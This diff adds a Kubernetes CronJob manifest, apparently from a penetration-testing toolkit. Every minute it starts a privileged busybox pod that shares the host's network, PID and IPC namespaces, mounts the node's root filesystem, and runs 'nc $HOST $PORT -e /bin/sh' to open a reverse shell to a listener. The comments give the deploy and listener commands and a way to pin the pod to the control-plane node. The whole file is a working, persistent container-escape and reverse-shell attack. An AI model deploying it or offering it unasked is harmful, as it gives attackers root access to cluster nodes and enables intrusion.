@@ -1,0 +1,37 @@
+###########################################################
+## Set up Listener: nc -nvlp [PORT]
+## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < everything-allowed-revshell-cronjob.yaml | kubectl apply -f - 
+## Remove: Remove: kubectl -n [namespace] delete everything-allowed-revshell-cronjob
+###########################################################
+apiVersion: batch/v1beta1
+kind: CronJob
+metadata:
+  name: everything-allowed-revshell-cronjob
+  labels:
+    app: pentest
+spec:
+  schedule: "*/1 * * * *"
+  concurrencyPolicy: Forbid
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          hostNetwork: true
+          hostPID: true
+          hostIPC: true
+          containers:
+          - name: everything-allowed-revshell-cronjob
+            image: busybox
+            command: [ "/bin/sh", "-c", "--" ]
+            args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+            securityContext:
+              privileged: true
+            volumeMounts:
+            - mountPath: /host
+              name: noderoot
+          #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+          volumes:
+          - name: noderoot
+            hostPath:
+              path: /
+          restartPolicy: OnFailure
